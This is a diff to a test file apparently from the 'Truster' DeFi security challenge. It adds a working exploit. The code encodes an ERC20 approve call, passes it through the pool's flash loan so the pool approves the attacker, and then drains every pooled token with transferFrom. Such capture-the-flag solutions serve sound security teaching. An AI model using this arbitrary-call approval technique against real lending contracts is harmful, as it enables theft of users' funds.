@@ -29,6 +29,29 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        //creating transaction to approve attacker address to move the tokens
+        const ABI = [ "function approve(address spender, uint256 amount) external returns (bool)" ];
+        const iface = new ethers.utils.Interface(ABI);
+        const calldata = iface.encodeFunctionData("approve", [attacker.address,TOKENS_IN_POOL]);
+        
+        const pool = this.pool.connect(attacker);
+
+        //calling the flashLoan with the pool as the borrower and the token addres as the target
+        await pool.flashLoan(
+            TOKENS_IN_POOL,
+            this.pool.address,
+            this.token.address,
+            calldata
+        );
+
+        const token = this.token.connect(attacker);
+        //getting the tokens approved
+        await token.transferFrom(
+            this.pool.address,
+            attacker.address,
+            TOKENS_IN_POOL
+        );
     });
 
     after(async function () {
